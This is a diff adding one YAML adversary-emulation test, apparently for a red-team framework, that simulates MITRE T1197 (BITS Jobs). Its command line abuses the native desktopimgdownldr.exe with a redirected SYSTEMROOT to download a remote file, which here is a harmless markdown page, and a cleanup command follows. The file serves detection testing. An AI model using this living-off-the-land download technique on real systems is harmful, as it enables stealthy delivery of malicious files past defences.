@@ -1,0 +1,19 @@
+---
+- id: 120efc1cd824a8039d1bde03788cd04a
+  name: Bits download using desktopimgdownldr.exe (cmd)
+  description: "This test simulates using desktopimgdownldr.exe to download a malicious\
+    \ file\ninstead of a desktop or lockscreen background img. The process that actually\
+    \ makes \nthe TCP connection and creates the file on the disk is a svchost process\
+    \ (\u201C-k netsvc -p -s BITS\u201D) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n"
+  tactic: multiple
+  technique:
+    attack_id: T1197
+    name: BITS Jobs
+  platforms:
+    windows:
+      cmd:
+        command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe
+          /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          /eventName:desktopimgdownldr
+        payloads: []
+        cleanup: del C:\Windows\Temp\Personalization\LockScreenImage\*.md >nul 2>&1
